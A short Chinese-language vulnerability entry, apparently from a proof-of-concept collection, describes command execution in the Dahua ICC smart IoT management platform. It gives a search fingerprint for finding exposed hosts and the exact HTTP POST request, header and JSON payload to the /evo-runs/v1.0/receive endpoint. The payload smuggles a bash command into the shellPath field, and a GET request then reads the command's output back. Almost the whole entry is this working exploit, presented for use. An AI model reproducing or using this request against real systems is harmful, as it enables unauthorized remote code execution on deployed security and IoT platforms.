# 大华ICC智能物联综合管理平台receive存在命令执行漏洞

- **系统**：大华　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`icon_hash="-1935899595"`
- **请求**：`POST /evo-runs/v1.0/receive HTTP/1.1`
- **关键头**：`Content-Type: application/json`　`X-Subject-Headerflag: ADAPT`　`Content-Length: 243`

**请求体 / payload**
```
"method": "agent.ossm.mapping.config",
"info": {
"configure": "abcd",
"filePath": "haha",
"paramMap": {
"shellPath": "/bin/bash -c id>/opt/evoWpms/static/1.txt",
"filePath": "abc"
},
"requestIp": ""
GET /static/1.txt HTTP/1.1
```
- **预期**：200　|　—